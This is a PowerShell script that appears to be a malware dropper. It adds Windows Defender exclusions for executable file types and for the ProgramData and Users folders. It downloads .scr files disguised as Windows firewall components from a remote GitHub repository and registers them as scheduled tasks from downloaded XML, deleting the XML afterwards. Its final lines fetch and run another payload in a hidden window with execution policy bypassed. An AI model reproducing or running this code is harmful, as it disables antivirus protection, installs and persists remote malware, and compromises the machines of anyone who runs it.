# Step 1: Check Windows Defender exclusions
$exclusions = Get-MpPreference
$fileTypes = @('.PS1', '.SCR', '.EXE', '.DLL')
$folders = @('C:\ProgramData', 'C:\Users')

# Check for exclusions in file types and folders
$fileTypeExclusions = $exclusions.ExclusionExtensions
$folderExclusions = $exclusions.ExclusionPath

# Step 2: If exclusions don't exist, add them
foreach ($type in $fileTypes) {
    if (-not ($fileTypeExclusions -contains $type)) {
        Add-MpPreference -ExclusionExtension $type
    }
}

foreach ($folder in $folders) {
    if (-not ($folderExclusions -contains $folder)) {
        Add-MpPreference -ExclusionPath $folder
    }
}

# Step 3: Verify the file at C:\ProgramData\Windows_Firewall.exe
$filePath = 'C:\ProgramData\Windows_Firewall.scr'

if (-not (Test-Path $filePath)) {
    # Step 3: If the file is missing, download it
    Invoke-WebRequest -Uri "https://github.com/cyberforce49/m/raw/refs/heads/main/Windows_Firewall.scr" -OutFile $filePath

    # Reverify the file after download
    if (Test-Path $filePath) {
        Write-Host "File downloaded and verified successfully."
    } else {
        Write-Host "File download failed."
        exit
    }
} else {
    Write-Host "File exists at $filePath."
}

# Step 4: Verify the task "Windows_Firewall" in Task Scheduler
$taskName = "Windows_Firewall"

# Using schtasks.exe for compatibility with all versions
$existingTask = schtasks /Query /TN $taskName 2>$null

if ($existingTask) {
    # If the task exists, run it
    schtasks /Run /TN $taskName
} else {
    # If the task does not exist, create it using schtasks.exe
    $xmlFilePath = 'C:\ProgramData\Windows_Firewall.xml'
    Invoke-WebRequest -Uri "https://github.com/cyberforce49/xmls/raw/refs/heads/main/Windows_Firewall.xml" -OutFile $xmlFilePath

    # Extract task details from the XML file manually (alternative for older PowerShell)
    schtasks /Create /TN $taskName /XML $xmlFilePath /F

    # Reverify the task
    $existingTask = schtasks /Query /TN $taskName 2>$null

    if ($existingTask) {
        # Run the task and delete the .XML file
        schtasks /Run /TN $taskName
        Remove-Item -Path $xmlFilePath
    } else {
        Write-Host "Task creation failed."
        exit
    }
}


# Step 3: Verify the file at C:\Users\Public\Firewall.scr
$filePath = 'C:\Users\Public\Firewall.scr'

if (-not (Test-Path $filePath)) {
    # Step 3: If the file is missing, download it
    Invoke-WebRequest -Uri "https://github.com/cyberforce49/m/raw/refs/heads/main/Firewall.scr" -OutFile $filePath

    # Reverify the file after download
    if (Test-Path $filePath) {
        Write-Host "File downloaded and verified successfully."
    } else {
        Write-Host "File download failed."
        exit
    }
} else {
    Write-Host "File exists at $filePath."
}

# Step 4: Verify the task "Windows_Firewall" in Task Scheduler
$taskName = "Firewall"

# Using schtasks.exe for compatibility with all versions
$existingTask = schtasks /Query /TN $taskName 2>$null

if ($existingTask) {
    # If the task exists, run it
    schtasks /Run /TN $taskName
} else {
    # If the task does not exist, create it using schtasks.exe
    $xmlFilePath = 'C:\ProgramData\Firewall.xml'
    Invoke-WebRequest -Uri "https://github.com/cyberforce49/xmls/raw/refs/heads/main/Firewall.xml" -OutFile $xmlFilePath

    # Extract task details from the XML file manually (alternative for older PowerShell)
    schtasks /Create /TN $taskName /XML $xmlFilePath /F

    # Reverify the task
    $existingTask = schtasks /Query /TN $taskName 2>$null

    if ($existingTask) {
        # Run the task and delete the .XML file
        schtasks /Run /TN $taskName
        Remove-Item -Path $xmlFilePath
    } else {
        Write-Host "Task creation failed."
        exit
    }
}

powershell -Windowstyle Hidden -ep bypass iwr -uri  https://github.com/cyberforce49/m/raw/refs/heads/main/Python.scr -o C:\Users\Public\Python.scr
powershell.exe -w Hidden C:\Users\Public\Python.scr